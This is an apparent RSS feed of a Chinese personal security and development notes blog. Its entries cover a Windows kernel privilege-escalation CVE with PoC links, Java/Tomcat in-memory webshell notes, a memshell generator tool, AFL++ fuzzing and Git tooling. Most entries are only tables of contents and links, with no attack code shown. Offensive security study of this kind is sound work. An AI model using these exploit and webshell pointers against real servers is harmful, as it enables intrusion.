@@ -1,0 +1,3145 @@
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="https://233official.github.io/dailynotes/rss.xsl"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <atom:link href="https://233official.github.io/dailynotes/rss.xml" rel="self" type="application/rss+xml"/>
+    <title>DailyNotes</title>
+    <link>https://233official.github.io/dailynotes/</link>
+    <description>233的日常学习记录</description>
+    <language>zh-CN</language>
+    <pubDate>Thu, 17 Oct 2024 11:23:10 GMT</pubDate>
+    <lastBuildDate>Thu, 17 Oct 2024 11:23:10 GMT</lastBuildDate>
+    <generator>@vuepress/plugin-feed</generator>
+    <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
+    <item>
+      <title>Windows提权</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Windows提权</source>
+      <description>Windows提权
+CVE
+TODO:CVE-2024-35250
+
+GitHub - varwara/CVE-2024-35250: PoC for the Untrusted Pointer Dereference in the ks.sys driverGitHub - varwara/CVE-2024-35250: PoC for the Un...</description>
+      <pubDate>Thu, 17 Oct 2024 11:21:32 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>CVE</h2>
+<h3>TODO:CVE-2024-35250</h3>
+<blockquote>
+<p><a href="https://github.com/varwara/CVE-2024-35250" target="_blank" rel="noopener noreferrer">GitHub - varwara/CVE-2024-35250: PoC for the Untrusted Pointer Dereference in the ks.sys driver</a><a href="https://github.com/varwara/CVE-2024-35250" target="_blank" rel="noopener noreferrer">GitHub - varwara/CVE-2024-35250: PoC for the Untrusted Pointer Dereference in the ks.sys driver</a></p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-99884" target="_blank" rel="noopener noreferrer">Windows 内核态驱动本地权限提升漏洞（CVE-2024-35250） - 知道创宇 Seebug 漏洞平台</a></p>
+<p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250" target="_blank" rel="noopener noreferrer">CVE-2024-35250 - 安全更新程序指南 - Microsoft - Windows 内核模式驱动程序特权提升漏洞</a></p>
+</blockquote>
+<ul>
+<li>
+<p>影响范围: Windows Server 2012, Windows Server 2008, Windows Server 2016, Windows 10 , Windows Server 2022,Windows 11</p>
+<blockquote>
+<p>详见 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250" target="_blank" rel="noopener noreferrer">CVE-2024-35250 - 安全更新程序指南 - Microsoft - Windows 内核模式驱动程序特权提升漏洞</a></p>
+</blockquote>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202410171602104.png" type="image/png"/>
+    </item>
+    <item>
+      <title>SpringMVC内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/SpringMVC/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/SpringMVC/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">SpringMVC内存马</source>
+      <description>SpringMVC内存马
+
+SpringMVC内存马
+
+环境配置
+
+使用IDEA
+使用VSCode
+
+创建一个基本的Maven Web项目
+添加依赖
+配置VSCode Task
+配置 WEB-INF
+
+
+
+
+编写一个基础的 Controller
+
+
+
+
+环境配置
+
+部署环境: tomcat:8 Docker(jdk21.0.2)
+开发环境: jdk21...</description>
+      <pubDate>Wed, 16 Oct 2024 10:54:17 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#springmvc%E5%86%85%E5%AD%98%E9%A9%AC">SpringMVC内存马</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a>
+<ul>
+<li><a href="#%E4%BD%BF%E7%94%A8idea">使用IDEA</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8vscode">使用VSCode</a>
+<ul>
+<li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%9A%84maven-web%E9%A1%B9%E7%9B%AE">创建一个基本的Maven Web项目</a></li>
+<li><a href="#%E6%B7%BB%E5%8A%A0%E4%BE%9D%E8%B5%96">添加依赖</a></li>
+<li><a href="#%E9%85%8D%E7%BD%AEvscode-task">配置VSCode Task</a></li>
+<li><a href="#%E9%85%8D%E7%BD%AE-web-inf">配置 WEB-INF</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E7%A1%80%E7%9A%84-controller">编写一个基础的 Controller</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202410162304623.png" type="image/png"/>
+    </item>
+    <item>
+      <title>AFL++ Fuzzing 实例</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/%E5%AE%9E%E4%BE%8B/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/%E5%AE%9E%E4%BE%8B/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">AFL++ Fuzzing 实例</source>
+      <description>AFL++ Fuzzing 实例
+
+antonio-morales/Fuzzing101: An step by step fuzzing tutorial. A GitHub Security Lab initiative</description>
+      <pubDate>Sat, 12 Oct 2024 10:50:26 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://github.com/antonio-morales/Fuzzing101" target="_blank" rel="noopener noreferrer">antonio-morales/Fuzzing101: An step by step fuzzing tutorial. A GitHub Security Lab initiative</a></p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>LibXML2 Fuzzing</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/%E5%AE%9E%E4%BE%8B/libxml2/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/%E5%AE%9E%E4%BE%8B/libxml2/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">LibXML2 Fuzzing</source>
+      <description>LibXML2 Fuzzing
+
+GNOME / libxml2 · GitLab
+GNOME/libxml2 at v2.13.4 (github.com)
+发布 · GNOME / libxml2 · GitLab
+
+
+Version2.9.4
+
+[Fuzzing101/练习 5 主要内容·antonio-morales/Fuzzing101 --...</description>
+      <pubDate>Sat, 12 Oct 2024 10:50:26 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://gitlab.gnome.org/GNOME/libxml2" target="_blank" rel="noopener noreferrer">GNOME / libxml2 · GitLab</a></p>
+<p><a href="https://github.com/GNOME/libxml2/tree/v2.13.4" target="_blank" rel="noopener noreferrer">GNOME/libxml2 at v2.13.4 (github.com)</a></p>
+<p><a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases" target="_blank" rel="noopener noreferrer">发布 · GNOME / libxml2 · GitLab</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202410121534410.png" type="image/png"/>
+    </item>
+    <item>
+      <title>AFL++</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">AFL++</source>
+      <description>AFL++
+
+AFL++安装与使用 | Closure (zh-closure.github.io)
+AFLplusplus/AFLplusplus: The fuzzer afl++ is afl with community patches, qemu 5.1 upgrade, collision-free coverage, enhanced l...</description>
+      <pubDate>Fri, 11 Oct 2024 10:01:53 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://zh-closure.github.io/2022/03/20/AFL++-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#%E4%BD%BF%E7%94%A8%EF%BC%9A" target="_blank" rel="noopener noreferrer">AFL++安装与使用 | Closure (zh-closure.github.io)</a></p>
+<p><a href="https://github.com/AFLplusplus/AFLplusplus" target="_blank" rel="noopener noreferrer">AFLplusplus/AFLplusplus: The fuzzer afl++ is afl with community patches, qemu 5.1 upgrade, collision-free coverage, enhanced laf-intel &amp; redqueen, AFLfast++ power schedules, MOpt mutators, unicorn_mode, and a lot more! (github.com)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202410111540370.png" type="image/png"/>
+    </item>
+    <item>
+      <title>java-memshell-generator</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/java-memshell-generator/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/java-memshell-generator/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">java-memshell-generator</source>
+      <description>java-memshell-generator
+
+pen4uin/java-memshell-generator: 一款支持自定义的 Java 内存马生成工具｜A customizable Java in-memory webshell generation tool. (github.com)
+
+
+概述
+这是一款支持自定义的 Java 内存马生成工具...</description>
+      <pubDate>Thu, 10 Oct 2024 11:42:56 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://github.com/pen4uin/java-memshell-generator" target="_blank" rel="noopener noreferrer">pen4uin/java-memshell-generator: 一款支持自定义的 Java 内存马生成工具｜A customizable Java in-memory webshell generation tool. (github.com)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202410101733465.png" type="image/png"/>
+    </item>
+    <item>
+      <title>代理</title>
+      <link>https://233official.github.io/dailynotes/DailyLife/Proxy.html</link>
+      <guid>https://233official.github.io/dailynotes/DailyLife/Proxy.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">代理</source>
+      <description>代理
+
+代理
+
+ClashForWindows(CFW)
+
+pip 报错 ValueError: check_hostname requires server_hostname
+TUN Mode
+Mixin
+Bypass
+内网断网主机出网流量走另一台联网主机
+
+
+clash-verge-rev
+
+图标卡死
+
+
+Proxifier
+
+
+
+
+ClashFo...</description>
+      <pubDate>Tue, 08 Oct 2024 08:38:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#%E4%BB%A3%E7%90%86">代理</a>
+<ul>
+<li><a href="#clashforwindowscfw">ClashForWindows(CFW)</a>
+<ul>
+<li><a href="#pip-%E6%8A%A5%E9%94%99-valueerror-check_hostname-requires-server_hostname">pip 报错 <code>ValueError: check_hostname requires server_hostname</code></a></li>
+<li><a href="#tun-mode">TUN Mode</a></li>
+<li><a href="#mixin">Mixin</a></li>
+<li><a href="#bypass">Bypass</a></li>
+<li><a href="#%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%87%BA%E7%BD%91%E6%B5%81%E9%87%8F%E8%B5%B0%E5%8F%A6%E4%B8%80%E5%8F%B0%E8%81%94%E7%BD%91%E4%B8%BB%E6%9C%BA">内网断网主机出网流量走另一台联网主机</a></li>
+</ul>
+</li>
+<li><a href="#clash-verge-rev">clash-verge-rev</a>
+<ul>
+<li><a href="#%E5%9B%BE%E6%A0%87%E5%8D%A1%E6%AD%BB">图标卡死</a></li>
+</ul>
+</li>
+<li><a href="#proxifier">Proxifier</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202302011518116.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Tomcat Listener 内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Tomcat Listener 内存马</source>
+      <description>Tomcat Listener 内存马
+
+JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)
+
+
+
+Tomcat Listener 内存马
+
+Listener内存马基本知识
+
+
+
+
+Listener内存马基本知识
+Servlet 和 Filter 相对于 Listener 更常用, 因此更容易找到内存马注入的相关材料, 而 List...</description>
+      <pubDate>Mon, 07 Oct 2024 14:23:21 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409301705658.png" type="image/png"/>
+    </item>
+    <item>
+      <title>通过模拟 servletContext.addServlet 注册 Servlet 内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/servletContext-addServlet.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/servletContext-addServlet.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">通过模拟 servletContext.addServlet 注册 Servlet 内存马</source>
+      <description>通过模拟 servletContext.addServlet 注册 Servlet 内存马
+
+JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)
+
+
+
+通过模拟 servletContext.addServlet 注册 Servlet 内存马
+
+Servlet内存马基本知识
+模拟 Servlet 动态加载
+
+编写一个示例 Servl...</description>
+      <pubDate>Mon, 30 Sep 2024 08:24:09 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409291130585.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Tomcat内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Tomcat内存马</source>
+      <description>Tomcat内存马</description>
+      <pubDate>Sun, 29 Sep 2024 03:25:18 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>通过模拟servletContext.addFilter注册Filter内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Filter%E5%86%85%E5%AD%98%E9%A9%AC/servletContext-addFilter.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Filter%E5%86%85%E5%AD%98%E9%A9%AC/servletContext-addFilter.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">通过模拟servletContext.addFilter注册Filter内存马</source>
+      <description>通过模拟servletContext.addFilter注册Filter内存马
+
+JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)
+
+
+
+通过模拟servletContext.addFilter注册Filter内存马
+
+Filter内存马基本知识
+配置环境
+创建一个新的Web应用程序
+注册一个 Servlet 用于动态添加 Fil...</description>
+      <pubDate>Sun, 29 Sep 2024 02:34:25 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://su18.org/post/memory-shell/#filter-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409241528634.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Gitee</title>
+      <link>https://233official.github.io/dailynotes/Git/Gitee.html</link>
+      <guid>https://233official.github.io/dailynotes/Git/Gitee.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Gitee</source>
+      <description>Gitee
+Gitee</description>
+      <pubDate>Wed, 25 Sep 2024 19:50:14 GMT</pubDate>
+      <content:encoded><![CDATA[<!--
+ * @Author: your name
+ * @Date: 2021-01-21 23:01:37
+ * @LastEditTime: 2021-01-22 00:01:27
+ * @LastEditors: Please set LastEditors
+ * @Description: In User Settings Edit
+ * @FilePath: \DailyNotes\社区相关\Gitee.md
+-->
+<h1>Gitee</h1>
+<p>Gitee</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Github</title>
+      <link>https://233official.github.io/dailynotes/Git/Github.html</link>
+      <guid>https://233official.github.io/dailynotes/Git/Github.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Github</source>
+      <description>Github
+
+Github
+
+加速
+
+Github 镜像
+
+Mirrors
+
+镜像测速
+
+
+
+
+PC网页端用户头像加载不出来
+
+
+Git配置
+
+SSH Key
+本地仓库切换 https 到 ssh
+SSH 代理
+
+
+简介
+
+Commit
+
+规范
+
+
+Issues
+Pull Request
+
+
+Actions
+
+基本概念
+workflow
+
+
+Mark...</description>
+      <pubDate>Wed, 25 Sep 2024 19:50:14 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#github">Github</a>
+<ul>
+<li><a href="#%E5%8A%A0%E9%80%9F">加速</a>
+<ul>
+<li><a href="#github-%E9%95%9C%E5%83%8F">Github 镜像</a>
+<ul>
+<li><a href="#mirrors">Mirrors</a>
+<ul>
+<li><a href="#%E9%95%9C%E5%83%8F%E6%B5%8B%E9%80%9F">镜像测速</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#pc%E7%BD%91%E9%A1%B5%E7%AB%AF%E7%94%A8%E6%88%B7%E5%A4%B4%E5%83%8F%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%87%BA%E6%9D%A5">PC网页端用户头像加载不出来</a></li>
+</ul>
+</li>
+<li><a href="#git%E9%85%8D%E7%BD%AE">Git配置</a>
+<ul>
+<li><a href="#ssh-key">SSH Key</a></li>
+<li><a href="#%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E5%88%87%E6%8D%A2-https-%E5%88%B0-ssh">本地仓库切换 https 到 ssh</a></li>
+<li><a href="#ssh-%E4%BB%A3%E7%90%86">SSH 代理</a></li>
+</ul>
+</li>
+<li><a href="#%E7%AE%80%E4%BB%8B">简介</a>
+<ul>
+<li><a href="#commit">Commit</a>
+<ul>
+<li><a href="#%E8%A7%84%E8%8C%83">规范</a></li>
+</ul>
+</li>
+<li><a href="#issues">Issues</a></li>
+<li><a href="#pull-request">Pull Request</a></li>
+</ul>
+</li>
+<li><a href="#actions">Actions</a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">基本概念</a></li>
+<li><a href="#workflow">workflow</a></li>
+</ul>
+</li>
+<li><a href="#markdown">Markdown</a>
+<ul>
+<li><a href="#%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">数学公式</a></li>
+</ul>
+</li>
+<li><a href="#webhooks">webhooks</a>
+<ul>
+<li><a href="#%E5%80%9F%E5%8A%A9%E9%92%89%E9%92%89%E7%9A%84github%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%B0%86%E4%BB%93%E5%BA%93%E5%8F%98%E5%8A%A8%E9%80%9A%E7%9F%A5%E5%88%B0%E9%92%89%E9%92%89%E7%BE%A4%E9%87%8C">借助钉钉的Github机器人将仓库变动通知到钉钉群里</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E9%80%89%E6%8B%A9">开源许可证选择</a></li>
+<li><a href="#copilot">Copilot</a>
+<ul>
+<li><a href="#copilotchatnextwebdeprecated">Copilot+ChatNextWeb(Deprecated)</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a>
+<ul>
+<li><a href="#%E8%B4%A6%E6%88%B7-suspended">账户 suspended</a></li>
+<li><a href="#git%E8%BF%87%E5%A4%A7">.git过大</a></li>
+<li><a href="#%E8%85%BE%E8%AE%AF%E4%BA%91-github-%E8%BF%9E%E6%8E%A5%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98">腾讯云 github 连接超时问题</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86">报错处理</a>
+<ul>
+<li><a href="#failed-to-connect-to-githubcom-port-443-after-21063-ms-timed-out"><code>Failed to connect to github.com port 443 after 21063 ms: Timed out</code></a></li>
+<li><a href="#openssl-ssl_read-connection-was-reset-errno-10054"><code>OpenSSL SSL_read: Connection was reset, errno 10054</code></a></li>
+</ul>
+</li>
+<li><a href="#%E6%9C%AA%E6%88%90%E5%8A%9F%E5%BD%92%E6%A1%A3todo">未成功归档/TODO</a>
+<ul>
+<li><a href="#nginx-%E5%8F%8D%E4%BB%A3-githubtodo-mark%E4%B8%8B-%E6%B2%A1%E6%88%90%E5%8A%9F%E8%B7%91%E8%B5%B7%E6%9D%A5">Nginx 反代 Github(TODO: mark下, 没成功跑起来)</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85-nginx-%E5%92%8C-openssl">安装 Nginx 和 OpenSSL</a></li>
+<li><a href="#%E5%88%B6%E4%BD%9C-ca-%E8%AF%81%E4%B9%A6%E4%B8%8E%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6">制作 CA 证书与签名证书</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6">安装证书</a></li>
+<li><a href="#%E9%85%8D%E7%BD%AE-nginx">配置 Nginx</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Gitlab</title>
+      <link>https://233official.github.io/dailynotes/Git/Gitlab.html</link>
+      <guid>https://233official.github.io/dailynotes/Git/Gitlab.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Gitlab</source>
+      <description>Gitlab
+
+Gitlab
+
+配置 access_token 使用 https clone 仓库
+Gitlab 搭建(想了想不想维护, 就没再搭了)
+
+配置参考
+创建工作目录
+安装 docker 并拉取官方镜像
+
+
+
+
+
+
+配置 access_token 使用 https clone 仓库
+
+git - Using GitLab token to c...</description>
+      <pubDate>Wed, 25 Sep 2024 19:50:14 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#gitlab">Gitlab</a>
+<ul>
+<li><a href="#%E9%85%8D%E7%BD%AE-access_token-%E4%BD%BF%E7%94%A8-https-clone-%E4%BB%93%E5%BA%93">配置 <code>access_token</code> 使用 https clone 仓库</a></li>
+<li><a href="#gitlab-%E6%90%AD%E5%BB%BA%E6%83%B3%E4%BA%86%E6%83%B3%E4%B8%8D%E6%83%B3%E7%BB%B4%E6%8A%A4-%E5%B0%B1%E6%B2%A1%E5%86%8D%E6%90%AD%E4%BA%86">Gitlab 搭建(想了想不想维护, 就没再搭了)</a>
+<ul>
+<li><a href="#%E9%85%8D%E7%BD%AE%E5%8F%82%E8%80%83">配置参考</a></li>
+<li><a href="#%E5%88%9B%E5%BB%BA%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95">创建工作目录</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85-docker-%E5%B9%B6%E6%8B%89%E5%8F%96%E5%AE%98%E6%96%B9%E9%95%9C%E5%83%8F">安装 docker 并拉取官方镜像</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202212131120239.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Git</title>
+      <link>https://233official.github.io/dailynotes/Git/</link>
+      <guid>https://233official.github.io/dailynotes/Git/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Git</source>
+      <description>Git
+
+Git飞行规则-git-flight-rules/README_zh-CN.md at master · k88hudson/git-flight-rules (github.com)
+
+
+Git
+
+查看与升级版本
+安装
+
+PPA
+
+
+配置
+场景
+
+同步框架开发
+
+
+仓库相关
+
+常规操作
+
+撤销提交
+
+
+分支操作
+查看某个文件变动的所有历史记...</description>
+      <pubDate>Wed, 25 Sep 2024 19:50:14 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://github.com/k88hudson/git-flight-rules/blob/master/README_zh-CN.md#merge-conflict" target="_blank" rel="noopener noreferrer">Git飞行规则-git-flight-rules/README_zh-CN.md at master · k88hudson/git-flight-rules (github.com)</a></p>
+</blockquote>
+<ul>
+<li><a href="#git">Git</a>
+<ul>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E4%B8%8E%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC">查看与升级版本</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85">安装</a>
+<ul>
+<li><a href="#ppa">PPA</a></li>
+</ul>
+</li>
+<li><a href="#%E9%85%8D%E7%BD%AE">配置</a></li>
+<li><a href="#%E5%9C%BA%E6%99%AF">场景</a>
+<ul>
+<li><a href="#%E5%90%8C%E6%AD%A5%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91">同步框架开发</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BB%93%E5%BA%93%E7%9B%B8%E5%85%B3">仓库相关</a>
+<ul>
+<li><a href="#%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C">常规操作</a>
+<ul>
+<li><a href="#%E6%92%A4%E9%94%80%E6%8F%90%E4%BA%A4">撤销提交</a></li>
+</ul>
+</li>
